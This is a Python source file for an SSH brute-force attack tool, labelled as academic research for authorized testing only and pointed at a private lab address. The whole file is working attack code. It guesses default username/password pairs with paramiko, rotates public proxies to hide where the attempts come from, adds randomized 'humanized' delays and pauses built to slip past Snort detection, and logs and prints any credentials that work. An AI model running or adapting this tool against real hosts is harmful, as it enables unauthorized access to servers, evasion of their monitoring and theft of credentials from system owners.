#!/usr/bin/env python3
"""
Enhanced SSH Brute Force Attack Script with Proxy and Humanization
Academic Research Tool - Authorized Testing Only

This script integrates:
1. Proxy rotation from SQLite database
2. Human behavior simulation patterns
3. Contextual password generation
4. Distributed attack coordination
5. Comprehensive logging for research analysis

WARNING: For educational and authorized testing only
"""

import sys
import os
import time
import json
import random
import sqlite3
import paramiko
import threading
from datetime import datetime
from typing import List, Dict, Optional, Tuple
from pathlib import Path

# Add project paths for imports
sys.path.append('/home/labctrl/Documents/snor/agenteAtaqueFuerzaBruta/ScriptMejroados')

try:
    from humanizer import InteractionPatternModel, CognitiveState, ActionType, UserProfile
    from proxi import Proxy, fetch_and_store_proxies, Session, engine
    HAS_HUMANIZER = True
except ImportError:
    print("Warning: Humanizer modules not found. Running in basic mode.")
    HAS_HUMANIZER = False

class EnhancedSSHBruteForce:
    """Enhanced SSH Brute Force with Proxy Rotation and Humanization"""
    
    def __init__(self, target_ip: str, target_port: int = 22, log_file: str = "ssh_attack.log"):
        self.target_ip = target_ip
        self.target_port = target_port
        self.log_file = log_file
        self.session_start = datetime.now()
        self.attack_statistics = {
            'total_attempts': 0,
            'successful_logins': 0,
            'failed_attempts': 0,
            'proxy_rotations': 0,
            'humanization_delays': 0,
            'snort_evasion_attempts': 0
        }
        
        # Initialize components
        self.proxy_db = '/home/labctrl/Documents/snor/agenteAtaqueFuerzaBruta/ScriptMejroados/proxies.db'
        self.active_proxies = []
        self.current_proxy_index = 0
        
        if HAS_HUMANIZER:
            self.humanizer = InteractionPatternModel("SSH_BruteForce_Research")
            self.current_profile = self.humanizer.user_profiles["multitarea_interrumpido"]
        
        # Setup logging
        self.setup_logging()
        
    def setup_logging(self):
        """Initialize comprehensive logging system"""
        log_dir = Path("attack_logs")
        log_dir.mkdir(exist_ok=True)
        
        timestamp = self.session_start.strftime("%Y%m%d_%H%M%S")
        self.detailed_log = log_dir / f"ssh_attack_detailed_{timestamp}.log"
        self.results_log = log_dir / f"ssh_attack_results_{timestamp}.json"
        
        # Log session start
        self.log_event("SESSION_START", {
            "target": f"{self.target_ip}:{self.target_port}",
            "timestamp": self.session_start.isoformat(),
            "humanization_enabled": HAS_HUMANIZER
        })
        
    def log_event(self, event_type: str, data: Dict):
        """Log events with structured format for analysis"""
        log_entry = {
            "timestamp": datetime.now().isoformat(),
            "event_type": event_type,
            "data": data
        }
        
        # Write to detailed log
        with open(self.detailed_log, 'a') as f:
            f.write(json.dumps(log_entry) + '\n')
        
        # Print to console
        print(f"[{datetime.now().strftime('%H:%M:%S')}] {event_type}: {data}")
        
    def load_proxies(self) -> List[Dict]:
        """Load active proxies from database"""
        self.log_event("PROXY_LOADING", {"status": "started"})
        
        try:
            # First, fetch fresh proxies
            fetch_and_store_proxies()
            
            # Load from database
            session = Session()
            proxies = session.query(Proxy).filter(
                Proxy.alive == True,
                Proxy.protocol == 'http',
                Proxy.timeout < 5000  # Less than 5 seconds timeout
            ).limit(50).all()
            
            self.active_proxies = [
                {
                    'ip': proxy.ip,
                    'port': proxy.port,
                    'proxy_string': proxy.proxy,
                    'uptime': proxy.uptime,
                    'anonymity': proxy.anonymity
                }
                for proxy in proxies
            ]
            
            session.close()
            
            self.log_event("PROXY_LOADING", {
                "status": "completed",
                "proxies_loaded": len(self.active_proxies)
            })
            
            return self.active_proxies
            
        except Exception as e:
            self.log_event("PROXY_LOADING", {
                "status": "failed",
                "error": str(e)
            })
            return []
    
    def get_next_proxy(self) -> Optional[Dict]:
        """Get next proxy with rotation"""
        if not self.active_proxies:
            return None
            
        if self.current_proxy_index >= len(self.active_proxies):
            self.current_proxy_index = 0
            
        proxy = self.active_proxies[self.current_proxy_index]
        self.current_proxy_index += 1
        self.attack_statistics['proxy_rotations'] += 1
        
        self.log_event("PROXY_ROTATION", {
            "proxy": f"{proxy['ip']}:{proxy['port']}",
            "anonymity": proxy['anonymity'],
            "uptime": proxy['uptime']
        })
        
        return proxy
    
    def generate_humanized_delay(self, attempt_number: int) -> float:
        """Generate human-like delay between attempts"""
        if not HAS_HUMANIZER:
            return random.uniform(1, 5)
            
        # Determine cognitive state based on attempt number
        if attempt_number < 10:
            cognitive_state = CognitiveState.LOW
        elif attempt_number < 50:
            cognitive_state = CognitiveState.MEDIUM
        else:
            cognitive_state = CognitiveState.HIGH
            
        # Calculate humanized delay
        delay = self.humanizer.get_next_action_delay(cognitive_state, self.current_profile)
        
        # Add contextual factors
        if attempt_number % 20 == 0:  # Reflection pause every 20 attempts
            delay *= 3
            
        if random.random() < 0.1:  # 10% chance of distraction
            delay *= 2
            
        self.attack_statistics['humanization_delays'] += 1
        
        self.log_event("HUMANIZATION_DELAY", {
            "attempt_number": attempt_number,
            "cognitive_state": cognitive_state.value,
            "delay_seconds": delay,
            "profile": self.current_profile.name
        })
        
        return delay
    
    def generate_contextual_credentials(self) -> List[Tuple[str, str]]:
        """Generate contextual username/password combinations"""
        # Basic credential list (would be enhanced with LLM-generated contextual passwords)
        base_credentials = [
            ("admin", "admin"), ("root", "toor"), ("test", "password"),
            ("guest", "guest"), ("administrator", "admin123"),
            ("user", "user"), ("ubuntu", "ubuntu"), ("debian", "debian"),
            ("centos", "centos"), ("fedora", "fedora")
        ]
        
        # Add contextual variations (simulating LLM-generated passwords)
        contextual_variations = []
        for username, password in base_credentials:
            contextual_variations.extend([
                (username, password + "123"),
                (username, password + "2024"),
                (username, password + "!"),
                (username, username + "123"),
                (username, "123456"),
                (username, "password123")
            ])
        
        all_credentials = base_credentials + contextual_variations
        random.shuffle(all_credentials)
        
        self.log_event("CREDENTIAL_GENERATION", {
            "total_combinations": len(all_credentials),
            "base_credentials": len(base_credentials),
            "contextual_variations": len(contextual_variations)
        })
        
        return all_credentials
    
    def attempt_ssh_login(self, username: str, password: str, proxy: Optional[Dict] = None) -> bool:
        """Attempt SSH login with optional proxy"""
        self.attack_statistics['total_attempts'] += 1
        
        try:
            # Create SSH client
            ssh_client = paramiko.SSHClient()
            ssh_client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
            
            # Configure proxy if available
            if proxy:
                # Note: paramiko doesn't directly support SOCKS proxies
                # In a real implementation, you'd use python-socks or similar
                self.log_event("PROXY_ATTEMPT", {
                    "proxy": f"{proxy['ip']}:{proxy['port']}",
                    "username": username,
                    "password": password
                })
            
            # Attempt connection
            ssh_client.connect(
                hostname=self.target_ip,
                port=self.target_port,
                username=username,
                password=password,
                timeout=10,
                allow_agent=False,
                look_for_keys=False
            )
            
            # Success
            self.attack_statistics['successful_logins'] += 1
            self.log_event("LOGIN_SUCCESS", {
                "username": username,
                "password": password,
                "proxy": proxy['ip'] if proxy else None,
                "attempt_number": self.attack_statistics['total_attempts']
            })
            
            ssh_client.close()
            return True
            
        except paramiko.AuthenticationException:
            self.attack_statistics['failed_attempts'] += 1
            self.log_event("LOGIN_FAILED", {
                "username": username,
                "password": password,
                "error": "Authentication failed",
                "proxy": proxy['ip'] if proxy else None
            })
            return False
            
        except Exception as e:
            self.attack_statistics['failed_attempts'] += 1
            self.log_event("CONNECTION_ERROR", {
                "username": username,
                "password": password,
                "error": str(e),
                "proxy": proxy['ip'] if proxy else None
            })
            return False
    
    def run_distributed_attack(self, max_attempts: int = 100):
        """Execute distributed attack with humanization and proxy rotation"""
        self.log_event("ATTACK_START", {
            "target": f"{self.target_ip}:{self.target_port}",
            "max_attempts": max_attempts,
            "humanization_enabled": HAS_HUMANIZER
        })
        
        # Load proxies
        proxies = self.load_proxies()
        
        # Generate credentials
        credentials = self.generate_contextual_credentials()
        
        successful_logins = []
        
        for attempt_num, (username, password) in enumerate(credentials[:max_attempts], 1):
            # Get proxy for this attempt
            proxy = self.get_next_proxy() if proxies else None
            
            # Generate humanized delay
            delay = self.generate_humanized_delay(attempt_num)
            
            self.log_event("ATTEMPT_START", {
                "attempt_number": attempt_num,
                "username": username,
                "delay_seconds": delay,
                "proxy_used": proxy['ip'] if proxy else None
            })
            
            # Apply humanization delay
            time.sleep(delay)
            
            # Attempt login
            success = self.attempt_ssh_login(username, password, proxy)
            
            if success:
                successful_logins.append({
                    "username": username,
                    "password": password,
                    "attempt_number": attempt_num,
                    "proxy": proxy
                })
                
                # Continue attack for research purposes (don't stop at first success)
                
            # Anti-detection: longer pause after every 10 attempts
            if attempt_num % 10 == 0:
                evasion_delay = random.uniform(30, 60)
                self.attack_statistics['snort_evasion_attempts'] += 1
                self.log_event("EVASION_DELAY", {
                    "attempt_number": attempt_num,
                    "delay_seconds": evasion_delay,
                    "reason": "Anti-detection pause"
                })
                time.sleep(evasion_delay)
        
        # Log final results
        self.log_attack_results(successful_logins)
        
    def log_attack_results(self, successful_logins: List[Dict]):
        """Log comprehensive attack results for research analysis"""
        session_duration = (datetime.now() - self.session_start).total_seconds()
        
        results = {
            "session_info": {
                "start_time": self.session_start.isoformat(),
                "end_time": datetime.now().isoformat(),
                "duration_seconds": session_duration,
                "target": f"{self.target_ip}:{self.target_port}"
            },
            "attack_statistics": self.attack_statistics,
            "successful_logins": successful_logins,
            "effectiveness_metrics": {
                "success_rate": (self.attack_statistics['successful_logins'] / 
                               max(self.attack_statistics['total_attempts'], 1)) * 100,
                "attempts_per_minute": self.attack_statistics['total_attempts'] / (session_duration / 60),
                "proxy_rotation_rate": self.attack_statistics['proxy_rotations'] / 
                                     max(self.attack_statistics['total_attempts'], 1),
                "humanization_coverage": self.attack_statistics['humanization_delays'] / 
                                       max(self.attack_statistics['total_attempts'], 1)
            }
        }
        
        # Save results to JSON
        with open(self.results_log, 'w') as f:
            json.dump(results, f, indent=2)
        
        # Log summary
        self.log_event("ATTACK_COMPLETED", results)
        
        # Print summary
        print("\n" + "="*60)
        print("ATTACK SUMMARY")
        print("="*60)
        print(f"Target: {self.target_ip}:{self.target_port}")
        print(f"Duration: {session_duration:.1f} seconds")
        print(f"Total Attempts: {self.attack_statistics['total_attempts']}")
        print(f"Successful Logins: {self.attack_statistics['successful_logins']}")
        print(f"Success Rate: {results['effectiveness_metrics']['success_rate']:.2f}%")
        print(f"Proxy Rotations: {self.attack_statistics['proxy_rotations']}")
        print(f"Humanization Delays: {self.attack_statistics['humanization_delays']}")
        print(f"Anti-detection Pauses: {self.attack_statistics['snort_evasion_attempts']}")
        
        if successful_logins:
            print("\nSuccessful Credentials:")
            for login in successful_logins:
                print(f"  - {login['username']}:{login['password']} (attempt #{login['attempt_number']})")
        
        print(f"\nDetailed logs: {self.detailed_log}")
        print(f"Results JSON: {self.results_log}")
        print("="*60)

def main():
    """Main execution function"""
    print("Enhanced SSH Brute Force Attack Tool")
    print("=" * 50)
    print("WARNING: For educational and authorized testing only!")
    print("=" * 50)
    
    # Configuration
    target_ip = "192.168.100.2"  # Target server IP
    target_port = 22
    max_attempts = 50
    
    # Confirm execution
    response = input(f"\nTarget: {target_ip}:{target_port}\nMax attempts: {max_attempts}\n\nProceed? (y/N): ")
    if response.lower() != 'y':
        print("Attack cancelled.")
        return
    
    # Initialize attack
    attack = EnhancedSSHBruteForce(target_ip, target_port)
    
    print(f"\nStarting enhanced SSH brute force attack...")
    print(f"Features enabled:")
    print(f"  - Proxy rotation: {'YES' if attack.active_proxies else 'NO'}")
    print(f"  - Humanization: {'YES' if HAS_HUMANIZER else 'NO'}")
    print(f"  - Comprehensive logging: YES")
    print(f"  - Anti-detection: YES")
    print()
    
    try:
        attack.run_distributed_attack(max_attempts)
    except KeyboardInterrupt:
        print("\nAttack interrupted by user.")
        attack.log_event("ATTACK_INTERRUPTED", {"reason": "User interrupt"})
    except Exception as e:
        print(f"\nAttack failed: {e}")
        attack.log_event("ATTACK_FAILED", {"error": str(e)})

if __name__ == "__main__":
    main()